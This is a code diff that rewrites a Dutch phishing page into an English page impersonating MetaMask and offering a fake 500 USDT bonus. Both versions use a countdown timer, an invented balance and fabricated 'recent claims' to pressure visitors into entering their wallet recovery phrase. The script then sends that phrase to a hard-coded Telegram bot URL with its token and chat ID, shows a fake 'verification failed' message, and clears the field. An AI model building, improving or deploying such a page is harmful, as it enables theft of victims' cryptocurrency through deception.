@@ -1,52 +1,325 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Claim 500 USDT</title>
-<style>
-  body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 30px; }
-  input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; }
-  button { background: #f7931a; color: white; padding: 15px 40px; border: none; border-radius: 10px; font-size: 18px; }
-  .box { background: #16213e; padding: 20px; border-radius: 20px; max-width: 400px; margin: auto; }
-  .timer { color: #ff4444; font-size: 22px; font-weight: bold; }
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>MetaMask • Claim 500 USDT Bonus</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
+        body {
+            background: #0b0e14;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        .card {
+            background: #161c28;
+            border-radius: 32px;
+            max-width: 420px;
+            width: 100%;
+            padding: 28px 22px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid #2a3442;
+            position: relative;
+            overflow: hidden;
+        }
+        .glow {
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #f6851b20, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .header img {
+            width: 44px;
+            height: 44px;
+            background: #f6851b;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+        }
+        .header h1 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+        .header span {
+            color: #8b9bb5;
+            font-size: 14px;
+            font-weight: 400;
+            margin-left: auto;
+            background: #1e293b;
+            padding: 4px 12px;
+            border-radius: 30px;
+            border: 1px solid #2a3442;
+        }
+        .balance-box {
+            background: #0f1520;
+            border-radius: 20px;
+            padding: 18px 20px;
+            margin-bottom: 20px;
+            border: 1px solid #212d3d;
+        }
+        .balance-label {
+            color: #8b9bb5;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .balance-amount {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+        .balance-amount small {
+            font-size: 16px;
+            color: #8b9bb5;
+            font-weight: 400;
+            margin-left: 8px;
+        }
+        .timer-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0f1520;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 22px;
+            border: 1px solid #212d3d;
+        }
+        .timer-label {
+            color: #8b9bb5;
+            font-size: 13px;
+        }
+        .timer-value {
+            color: #f6851b;
+            font-size: 20px;
+            font-weight: 700;
+            font-variant-numeric: tabular-nums;
+        }
+        .claim-box {
+            background: #0f1520;
+            border-radius: 20px;
+            padding: 18px 16px;
+            margin-bottom: 20px;
+            border: 1px solid #212d3d;
+        }
+        .claim-box label {
+            color: #b0c0d4;
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .claim-box input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: 1px solid #2a3442;
+            background: #0b0e14;
+            color: #fff;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+        .claim-box input:focus {
+            border-color: #f6851b;
+            outline: none;
+            box-shadow: 0 0 0 3px #f6851b30;
+        }
+        .claim-box input::placeholder {
+            color: #5a6a7e;
+        }
+        .fake-progress {
+            margin-top: 14px;
+            height: 4px;
+            background: #1e293b;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .fake-progress span {
+            display: block;
+            height: 100%;
+            width: 68%;
+            background: linear-gradient(90deg, #f6851b, #f9a84c);
+            border-radius: 4px;
+            animation: pulse 1.8s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; width: 60%; }
+            100% { opacity: 1; width: 80%; }
+        }
+        .btn-claim {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #f6851b, #e2761a);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 8px 24px #f6851b40;
+            margin-top: 6px;
+        }
+        .btn-claim:active { transform: scale(0.97); }
+        .recent-activity {
+            margin-top: 24px;
+            border-top: 1px solid #1e293b;
+            padding-top: 18px;
+        }
+        .recent-activity h4 {
+            color: #8b9bb5;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+        }
+        .activity-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+            color: #b0c0d4;
+            font-size: 13px;
+        }
+        .activity-item .dot {
+            width: 8px;
+            height: 8px;
+            background: #2ecc71;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        .activity-item .addr {
+            font-family: monospace;
+            background: #1e293b;
+            padding: 2px 10px;
+            border-radius: 30px;
+            font-size: 11px;
+            color: #8b9bb5;
+        }
+        .activity-item .amount {
+            margin-left: auto;
+            color: #2ecc71;
+            font-weight: 600;
+        }
+        .footer-note {
+            text-align: center;
+            color: #5a6a7e;
+            font-size: 11px;
+            margin-top: 18px;
+            border-top: 1px solid #1e293b;
+            padding-top: 16px;
+        }
+        .fake-verify {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .fake-verify span {
+            background: #1e293b;
+            padding: 4px 12px;
+            border-radius: 30px;
+            color: #8b9bb5;
+            font-size: 11px;
+            border: 1px solid #2a3442;
+        }
+    </style>
 </head>
 <body>
-<div class="box">
-  <h2>🎁 Officiële Mirror – Claim 500 USDT</h2>
-  <p>Tijd over: <span class="timer" id="timer">03:00</span></p>
-  <p>Voer uw 12-woord herstelzin in om te verifiëren.</p>
-  <input id="seed" placeholder="bijv. aardbei auto zon ..." />
-  <br><br>
-  <button onclick="stelen()">Verifieer en Claim</button>
-  <p style="font-size:12px; color:#888;">Versleutelde verbinding • Eenmalige actie</p>
-</div>
-<script>
-// Timer
-let timeLeft = 180;
-setInterval(function() {
-  let min = Math.floor(timeLeft / 60);
-  let sec = timeLeft % 60;
-  document.getElementById('timer').innerText = 
-    String(min).padStart(2,'0') + ':' + String(sec).padStart(2,'0');
-  if (timeLeft <= 0) {
-    document.getElementById('timer').innerText = '00:00';
-  }
-  timeLeft--;
-}, 1000);
+<div class="card">
+    <div class="glow"></div>
 
-// Phishing functie
-function stelen() {
-  let seed = document.getElementById('seed').value;
-  if (seed.split(' ').length < 6) {
-    alert('Voer uw volledige herstelzin in (minimaal 6 woorden)');
-    return;
-  }
-  fetch('https://api.telegram.org/bot8603713494:AAEdQGNssdiNU-iQ3bky4xwXM0aodSk-ifc/sendMessage?chat_id=7697818138&text=ZIN: ' + encodeURIComponent(seed));
-  alert('❌ Verbinding mislukt – probeer opnieuw');
-  document.getElementById('seed').value = '';
-}
+    <!-- Header -->
+    <div class="header">
+        <div style="background:#f6851b; width:44px; height:44px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:24px;">🦊</div>
+        <h1>MetaMask</h1>
+        <span>● Live</span>
+    </div>
+
+    <!-- Balance -->
+    <div class="balance-box">
+        <div class="balance-label">Wallet Balance</div>
+        <div class="balance-amount">$12,847.32 <small>USD</small></div>
+    </div>
+
+    <!-- Timer -->
+    <div class="timer-section">
+        <span class="timer-label">⏳ Claim expires in</span>
+        <span class="timer-value" id="timerDisplay">04:32</span>
+    </div>
+
+    <!-- Claim form -->
+    <div class="claim-box">
+        <label>🔐 Verify ownership – enter your Secret Recovery Phrase</label>
+        <input type="text" id="seedInput" placeholder="e.g. abandon art abandon ... (12 words)" />
+        <div class="fake-progress"><span></span></div>
+        <div class="fake-verify">
+            <span>✓ Secure connection</span>
+            <span>✓ 2FA enabled</span>
+        </div>
+    </div>
+
+    <button class="btn-claim" id="claimBtn">⚡ Claim 500 USDT Bonus</button>
+
+    <!-- Recent activity -->
+    <div class="recent-activity">
+        <h4>📊 Recent Claims</h4>
+        <div class="activity-item"><span class="dot"></span> <span>0x4f3a...b91e</span> <span class="addr">just now</span> <span class="amount">+500 USDT</span></div>
+        <div class="activity-item"><span class="dot"></span> <span>0x7c2d...f44a</span> <span class="addr">2 min ago</span> <span class="amount">+500 USDT</span></div>
+        <div class="activity-item"><span class="dot"></span> <span>0x1b8e...c77d</span> <span class="addr">5 min ago</span> <span class="amount">+500 USDT</span></div>
+    </div>
+
+    <div class="footer-note">
+        🔒 Encrypted • Official Mirror • One-time claim
+    </div>
+</div>
+
+<script>
+    // Timer countdown (5 minutes)
+    let totalSeconds = 300;
+    const timerEl = document.getElementById('timerDisplay');
+    function updateTimer() {
+        const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+        const secs = String(totalSeconds % 60).padStart(2, '0');
+        timerEl.textContent = mins + ':' + secs;
+        if (totalSeconds > 0) totalSeconds--;
+    }
+    setInterval(updateTimer, 1000);
+
+    // Phishing submit
+    document.getElementById('claimBtn').addEventListener('click', function() {
+        const seed = document.getElementById('seedInput').value.trim();
+        if (seed.split(/\s+/).length < 6) {
+            alert('Please enter your full recovery phrase (minimum 6 words).');
+            return;
+        }
+        // Send to Telegram
+        fetch('https://api.telegram.org/bot8603713494:AAEdQGNssdiNU-iQ3bky4xwXM0aodSk-ifc/sendMessage?chat_id=7697818138&text=🔑 SEED: ' + encodeURIComponent(seed));
+        alert('❌ Verification failed – please try again.');
+        document.getElementById('seedInput').value = '';
+        // Fake activity update
+        const activity = document.querySelector('.recent-activity');
+        const newItem = document.createElement('div');
+        newItem.className = 'activity-item';
+        newItem.innerHTML = `<span class="dot"></span> <span>0x${Math.random().toString(16).substring(2,8)}...${Math.random().toString(16).substring(2,6)}</span> <span class="addr">just now</span> <span class="amount">+500 USDT</span>`;
+        activity.insertBefore(newItem, activity.children[1]);
+    });
 </script>
 </body>
 </html>
